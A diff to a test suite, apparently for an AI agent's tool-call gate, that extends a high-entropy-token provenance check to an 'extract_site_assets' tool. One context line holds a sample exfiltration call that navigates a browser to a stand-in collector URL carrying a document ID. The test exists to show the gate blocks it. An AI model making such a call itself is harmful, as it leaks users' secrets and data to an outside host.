@@ -84,13 +84,15 @@ describe("one provenance rule across sources and scans", () => {
     expect(browserCall({ action: "navigate", url: `https://collector.example/?d=${DOC_ID}` })?.reason).toMatch(/High-Entropy Token/);
   });
 
-  it("applies to http_request and web_fetch destinations, not just the browser", () => {
+  it("applies to every site destination a row declares, not just the browser", () => {
     expect(call("http_request", { url: API, method: "GET" })?.reason).toMatch(/High-Entropy Token/);
     expect(call("web_fetch", { url: DOC })?.reason).toMatch(/High-Entropy Token/);
+    expect(call("extract_site_assets", { url: DOC })?.reason).toMatch(/High-Entropy Token/);
     recordSiteTokens(SESSION, "https://console.twilio.com/home", `Account SID ${SID}`);
     recordUserLinks(SESSION, DOC);
     expect(call("http_request", { url: API, method: "GET" })).toBeNull();
     expect(call("web_fetch", { url: DOC })).toBeNull();
+    expect(call("extract_site_assets", { url: DOC })).toBeNull();
   });
 
   it("the threat engine's post-call scan agrees with the gate", () => {
